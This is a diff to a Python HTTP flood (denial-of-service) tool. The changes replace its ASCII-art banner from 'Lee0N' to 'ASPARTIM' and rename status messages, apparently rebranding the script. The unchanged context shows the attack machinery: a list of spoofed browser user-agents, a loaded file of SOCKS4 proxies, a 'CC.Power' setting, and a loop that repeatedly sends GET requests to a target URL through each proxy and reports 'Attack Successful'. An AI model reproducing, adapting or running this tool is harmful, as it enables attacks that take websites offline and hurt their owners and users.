@@ -8,25 +8,18 @@ from colorama import Fore
 
 print(Fore.RED)
 print ('''
-   ***
-  ** **
- **   **
- **   **         ****
- **   **       **   ****
- **  **       *   **   **
-  **  *      *  **  ***  **
-   **  *    *  **     **  *
-    ** **  ** **        **
-    **   **  **
-   *           *
-  *             *
- *    0     0    *
- *   /   @   \   *
- *   \__/ \__/   *
-   *     W     *
-     **     **
-       ***** Lee0N
------------------------------------- ''')
+      .---.        .-----------
+     /     \  __  /    ------
+    / /     \(  )/    -----
+   //////   ' \/ `   ---
+  //// / // :    : ---
+ // /   /  /`    '--
+//          //..\\
+       ====UU====UU====
+           '//||\\`
+             ''``
+           ASPARTIM
+------------------------------- ''')
 
 userag = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
@@ -188,7 +181,7 @@ def main():
 	else:
 		list = str(list)
 	pprr = open(list).readlines()
-	print(Fore.BLUE + "[+] Socks4 Count : " + Fore.WHITE + "%d " %len(pprr))
+	print(Fore.BLUE + "[+] Socks4 Available : " + Fore.WHITE + "%d " %len(pprr))
 	pwr = int(input(Fore.BLUE + "[+] CC.Power (1-100) : " + Fore.WHITE))
 	opth()
 
@@ -212,7 +205,7 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print(Fore.GREEN + "[+] Socks Attack Successful [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + Fore.WHITE)
+						print(Fore.GREEN + "[+] AsparTim Attack Successful [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + Fore.WHITE)
 					s.close
 				except:
 					s.close()
